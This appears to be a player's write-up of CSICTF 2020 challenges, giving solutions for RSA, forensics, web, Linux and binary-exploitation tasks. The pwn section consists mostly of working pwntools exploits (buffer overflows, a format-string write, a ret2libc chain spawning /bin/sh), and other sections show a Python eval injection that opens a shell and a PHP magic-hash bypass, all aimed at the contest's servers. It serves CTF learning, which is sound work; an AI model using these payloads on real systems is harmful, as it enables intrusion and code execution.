ma p# CSICTF 2020

## Crypto

### Rivest Shamir Adleman
We have a file enc.txt that contain:
```
n = 408579146706567976063586763758203051093687666875502812646277701560732347095463873824829467529879836457478436098685606552992513164224712398195503564207485938278827523972139196070431397049700119503436522251010430918143933255323117421712000644324381094600257291929523792609421325002527067471808992410166917641057703562860663026873111322556414272297111644069436801401012920448661637616392792337964865050210799542881102709109912849797010633838067759525247734892916438373776477679080154595973530904808231
e = 65537
c = 226582271940094442087193050781730854272200420106419489092394544365159707306164351084355362938310978502945875712496307487367548451311593283589317511213656234433015906518135430048027246548193062845961541375898496150123721180020417232872212026782286711541777491477220762823620612241593367070405349675337889270277102235298455763273194540359004938828819546420083966793260159983751717798236019327334525608143172073795095665271013295322241504491351162010517033995871502259721412160906176911277416194406909
```
With factordb we can factorize 'n' and find 'p' and 'q'.
```python
from Crypto.Util.number import *

p = 15485863
q = 26384008867091745294633354547835212741691416673097444594871961708606898246191631284922865941012124184327243247514562575750057530808887589809848089461174100421708982184082294675500577336225957797988818721372546749131380876566137607036301473435764031659085276159909447255824316991731559776281695919056426990285120277950325598700770588152330565774546219611360167747900967511378709576366056727866239359744484343099322440674434020874200594041033926202578941508969596229398159965581521326643115137
phi = (p - 1)*(q - 1)
d = inverse(e, phi)

print(long_to_bytes(pow(c, d, p * q)))
# csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}
```

### Little RSA
We have a file a.txt that contains:
```
c = 32949
n = 64741
e = 42667
```

We can factorize 'n' with factordb to do most fast.
```python
from Crypto.Util.number import *

p = 101
q = 641
phi = (p - 1)*(q - 1)

d = inverse(e, phi)
print(pow(c, d, n))
# 18429
```
We can use this password to open the zip file and find the flag in flag.txt.
`csictf{gr34t_m1nds_th1nk_4l1ke}`


## Miscellaneous

### Escape Plan
We can use the vuln in eval.
We can send in input `eval('__import__("os").system("/bin/sh")')` and have the shell access.
There are a `.git` repository in the directory but there are `git` command, so i can't see commit log.
We can search the repository on GitHub and see all commit, a commits named 'oops xD' there are a file deleted, we can see the file and there are the flag `csictf{2077m4y32_h45_35c4p3d}`.


## Forensics

### Gradient Sky
We can use `binwalk -dd sky.jpg` and exctract all file hidden, there is a dir with a rar `4807E.rar` we can unzip and find a file that contains the flag `csictf{j0ker_w4snt_happy}`.


## Pwn

### pwn intended 0x1
There are a simple buffer overflow.
```python
from pwn import *

elf = ELF("pwn-intended-0x1")
HOST = "chall.csivit.com"
PORT = 30001
p = remote(HOST, PORT)
p.sendlineafter("\n", "A" * 255)
p.interactive()

# FLAG --> csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
```

### pwn intended 0x2
```python
from pwn import * 
elf = ELF("pwn-intended-0x2")
HOST = "chall.csivit.com"
PORT = 30007
r = remote(HOST, PORT)

payload = b"A"*44
payload += p64(0xCAFEBABE)

r.sendlineafter("\n", payload)
r.interactive()
# csictf{c4n_y0u_re4lly_telep0rt?}
```

### pwn intended 0x3
```python
from pwn import * 
elf = ELF("pwn-intended-0x3")
HOST = "chall.csivit.com"
PORT = 30013
r = remote(HOST,PORT)

payload = b'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'
payload += p64(0x401128)
payload += p64(0x00000000004011ce)

r.sendlineafter("\n", payload)
r.interactive()
# csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
```
###Secret Society
```python
from pwn import *

elf = ELF("secret-society")
HOST = "chall.csivit.com"
PORT = 30041
p = remote(HOST, PORT)

p.sendlineafter("\n", "A" * 150)
p.stream()

```
### Global Warming
A simple format string
```python
from pwn import *

elf = ELF("global-warming")
HOST = "chall.csivit.com"
PORT = 30023
p = remote(HOST, PORT)

write = {0x804c02c: 0xb4dbabe3}
payload = fmtstr_payload(12, write)
p.sendline(payload)
p.stream()

# FLAG --> csictf{n0_5tr1ng5_@tt@ch3d}
```
### Smash
```python
from pwn import *

exe = ELF("hello")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.23.so")
rop = ROP("./hello")
r = remote("chall.csivit.com", 30046)

print(r.recvline())
offset = 136

payload = b"M" * offset
payload += p32(exe.plt["puts"])
payload += p32(exe.sym["main"])
payload += p32(exe.got["malloc"])
r.sendline(payload)

r.recvuntil("!\n")
malloc = u32(r.recv(4))
libc_base = malloc - libc.sym["malloc"]
log.info("Libc base address --> %s", hex(libc_base))

system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

payload2 = b"M" * offset
payload2 += p32(system)
payload2 += b"MMMM"
payload2 += p32(binsh)

for _ in range(2):
    r.recvline()
r.sendline(payload2)
r.interactive()

# FLAG --> csictf{5up32_m4210_5m45h_8202}

```
## Web

### Cascade
In the source we can see the file `/static/style.css` than contain the flag.
`csictf{w3lc0me_t0_csictf}`


### Oreo
Open the website we have this message:
`My nephew is a fussy eater and is only willing to eat chocolate oreo. Any other flavour and he throws a tantrum.`

With burp we can intercept the request and we can see `flavour=c3RyYXdiZXJyeQ==`
Decoded it in base64 we have `strawberry`, so that nephew eat only chocolate we can encode in base64 and replace with `Y2hvY29sYXRl` and send the request, we received the flag `csictf{1ick_twi5t_dunk}`.

### Warm Up
```php
<?php

if (isset($_GET['hash'])) {
    if ($_GET['hash'] === "10932435112") {
        die('Not so easy mate.');
    }

    $hash = sha1($_GET['hash']);
    $target = sha1(10932435112);
    if($hash == $target) {
        include('flag.php');
        print $flag;
    } else {
        print "csictf{loser}";
    }
} else {
    show_source(__FILE__);
}

?>
```
We have this snippet of code, if i try `http://chall.csivit.com:30272/?hash=10932435112` the page return 'Not so easy mate.'.
So we do to bypass this limit, we can see:
```php
$hash = sha1(10932435112);
// 0e07766915004133176347055865026311692244
```
So it's start with `0e` and this is considerate like a float, so we can bypass '==' insert a string than the hash started with `0e`, example `aaroZmOk`.
With `http://chall.csivit.com:30272/?hash=aaroZmOk` we have the flag `csictf{typ3_juggl1ng_1n_php}`.

### Mr Rami
In this challenge there are many referiment to a bot, we can search in the robots.txt and we have:
```
# Hey there, you're not a robot, yet I see you sniffing through this file.
# SEO you later!
# Now get off my lawn.

Disallow: /fade/to/black
```
In the link we can find the flag `csictf{br0b0t_1s_pr3tty_c00l_1_th1nk}`.


## Linux

### Aka
We can use `echo *` to see the list of file in the directory.
There are a file flag.txt, we open it with `echo $(<flag.txt)` and print the flag `csictf{1_4m_cl4rk3_k3nt}`.

### Find32
We connect to ssh with the password find32.
With ls we can see there are a lot of file named like: `4UOCNFI8  9EO10QRH  EBGAB2T7...`.
We use `grep -Rl "csictf{" /user1` to find a file that contains the flag.
Only one file is printed: `MITS1KT3`, opened it i find `csictf{not_the_flag}{user2:AAE976A5232713355D58584CFE5A5}` and i think its the password of user2, so connect to user2 and we can see: `adgsfdgasf.d  fadf.x  janfjdkn.txt  notflag.txt  sadsas.tx`.
I grep file recursily but there aren't a flag, becouse the flag not start with csictf{ }.
So i open the file and i see there are the same element in this and i use grep to find only line not present in the other file, `grep -F -x -v -f notflag.txt sadsas.tx` and i have `th15_15_unu5u41` -> `csictf{th15_15_unu5u41}`

